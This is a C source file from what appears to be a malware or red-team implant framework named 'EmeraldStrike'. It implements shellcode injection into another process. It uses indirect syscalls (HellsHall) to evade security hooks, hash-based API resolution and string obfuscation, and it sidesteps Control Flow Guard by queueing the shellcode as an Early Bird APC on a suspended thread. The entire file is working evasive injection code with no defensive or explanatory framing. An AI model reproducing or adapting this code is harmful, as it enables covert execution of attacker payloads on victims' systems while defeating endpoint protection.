// EmeraldStrike - HellsHall indirect-syscall injection technique
// Uses resolved NT syscalls via HellsHall when INCLUDE_EVASION_HELLSHALL is
// defined and inst->bHellsHallInit is TRUE. Selected automatically by the
// dispatcher whenever HellsHall is active (preferred over the compile-time
// INJECTION_TECHNIQUE choice); falls back to gate_* wrappers otherwise.
#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#ifdef INCLUDE_EVASION_HELLSHALL
#include "evasion/hellshall.h"

HANDLE inject_hellshall(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (!inst->bHellsHallInit) {
        DBG(inst, "[INJECT] HellsHall not initialized, falling back to gate wrappers");
        // Fall back to CRT-style injection with gate_ wrappers
        if (step) *step = 21;
        LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote) return NULL;
        if (step) *step = 22;
        SIZE_T written = 0;
        gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);
        if (step) *step = 23;
        DWORD old_protect = 0;
        gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
        if (step) *step = 24;
        return gate_CreateRemoteThread(inst,
            hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    }

    NTSTATUS status;

    // NtAllocateVirtualMemory(hProcess, &BaseAddress, 0, &RegionSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    DBG(inst, "[INJECT-HH] NtAllocateVirtualMemory");
    if (step) *step = 21;
    PVOID remote = NULL;
    SIZE_T region_size = (SIZE_T)sc_len;
    status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtAllocateVirtualMemory],
        hProcess, &remote, (ULONG_PTR)0, &region_size,
        (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_READWRITE);
    if (status < 0 || !remote) {
        DBG(inst, "[INJECT-HH] NtAllocateVirtualMemory FAILED");
        return NULL;
    }

    // NtWriteVirtualMemory(hProcess, remote, shellcode, sc_len, &written)
    DBG(inst, "[INJECT-HH] NtWriteVirtualMemory");
    if (step) *step = 22;
    SIZE_T written = 0;
    status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtWriteVirtualMemory],
        hProcess, remote, (PVOID)shellcode, (SIZE_T)sc_len, &written);
    if (status < 0) {
        DBG(inst, "[INJECT-HH] NtWriteVirtualMemory FAILED");
    }

    // NtProtectVirtualMemory(hProcess, &remote, &region_size, PAGE_EXECUTE_READ, &old)
    DBG(inst, "[INJECT-HH] NtProtectVirtualMemory");
    if (step) *step = 23;
    PVOID protect_base = remote;
    SIZE_T protect_size = region_size;
    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    DWORD new_protect = PAGE_EXECUTE_READ;
#else
    DWORD new_protect = PAGE_EXECUTE_READWRITE;
#endif
    status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtProtectVirtualMemory],
        hProcess, &protect_base, &protect_size, new_protect, &old_protect);

    // ─── CFG-safe thread creation (Early Bird) ───
    // Creating a thread whose start routine is our shellcode trips CFG:
    // BaseThreadInitThunk performs a CFG-checked indirect call on the start
    // address, and anonymous executable memory is never in the CFG bitmap →
    // FAST_FAIL_GUARD_ICALL_CHECK_FAILURE (0xC0000409, subcode 0xA).
    //
    // Instead: create the thread suspended with a CFG-valid start routine
    // (RtlExitUserThread, an ntdll export), queue the shellcode as an APC,
    // then resume. The APC is delivered before the start routine runs, so the
    // shellcode executes without ever being dispatched through the CFG check.
    if (step) *step = 24;
    xstr(_s_rtlexit, "RtlExitUserThread");
    PVOID cfg_safe_start = resolve_function(inst->Modules.Ntdll,
        hash_string_djb2(_s_rtlexit));
    if (!cfg_safe_start) {
        // Fallback: any resolved ntdll export is a valid CFG target.
        cfg_safe_start = inst->HH_Syscalls[HH_IDX_NtClose].pSyscallAddress;
    }
    if (!cfg_safe_start) {
        DBG(inst, "[INJECT-HH] No CFG-safe start routine");
        return NULL;
    }

    DBG(inst, "[INJECT-HH] NtCreateThreadEx (suspended)");
    HANDLE hThread = NULL;
    status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtCreateThreadEx],
        &hThread, (ACCESS_MASK)THREAD_ALL_ACCESS, (PVOID)NULL, hProcess,
        cfg_safe_start, (PVOID)NULL, (ULONG)TRUE /*CREATE_SUSPENDED*/,
        (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, (PVOID)NULL);
    if (status < 0 || !hThread) {
        DBG(inst, "[INJECT-HH] NtCreateThreadEx FAILED");
        return NULL;
    }

    // Queue the shellcode as an APC to the suspended thread
    DBG(inst, "[INJECT-HH] NtQueueApcThread");
    if (step) *step = 25;
    status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtQueueApcThread],
        hThread, remote, (PVOID)NULL, (PVOID)NULL, (PVOID)NULL);
    if (status < 0) {
        DBG(inst, "[INJECT-HH] NtQueueApcThread FAILED");
        HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtClose], hThread);
        return NULL;
    }

    // Resume - the APC fires before the start routine
    DBG(inst, "[INJECT-HH] NtResumeThread");
    if (step) *step = 26;
    status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtResumeThread],
        hThread, (PVOID)NULL);
    if (status < 0) {
        DBG(inst, "[INJECT-HH] NtResumeThread FAILED");
        HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtClose], hThread);
        return NULL;
    }

    return hThread;
}

#endif // INCLUDE_EVASION_HELLSHALL
